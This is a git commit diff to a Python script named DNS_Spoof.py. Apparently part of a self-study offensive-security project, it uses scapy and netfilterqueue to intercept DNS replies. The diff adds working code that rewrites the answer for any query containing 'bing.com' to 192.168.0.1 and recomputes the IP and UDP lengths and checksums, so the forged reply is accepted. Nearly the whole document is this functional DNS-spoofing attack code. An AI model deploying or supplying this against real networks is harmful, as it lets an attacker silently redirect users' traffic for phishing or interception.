c95e9003d3738b3e8d5bbc5c24b2f83f4ede3669
Kali <ttomek.koziak@gmail.com>
2020-09-01 09:39:23 -0400

    scapy change IP

--- DNS_Spoof/DNS_Spoof.py
+++ DNS_Spoof/DNS_Spoof.py
@@ -3,9 +3,24 @@
 import netfilterqueue
 import scapy.all as scapy
 
+
 def process_packet(packet):
-    scpay_packet = scapy.IP(packet.get_payload())
-    print(scpay_packet.show())
+    scapy_packet = scapy.IP(packet.get_payload())
+    if scapy_packet.haslayer(scapy.DNSRR):
+        qname = scapy_packet[scapy.DNSQR].qname
+        print(qname)
+        if "bing.com" in str(qname):
+            print("[+] Spoofing target ")
+            answer = scapy.DNSRR(rrname=qname, rdata="192.168.0.1")
+            scapy_packet[scapy.DNS].an = answer
+            scapy_packet[scapy.DNS].ancount = 1
+            del scapy_packet[scapy.IP].len
+            del scapy_packet[scapy.IP].chksum
+            del scapy_packet[scapy.UDP].len
+            del scapy_packet[scapy.UDP].chksum
+
+            packet.set_payload(bytes(scapy_packet))
+
     packet.accept()
 
 queue = netfilterqueue.NetfilterQueue()
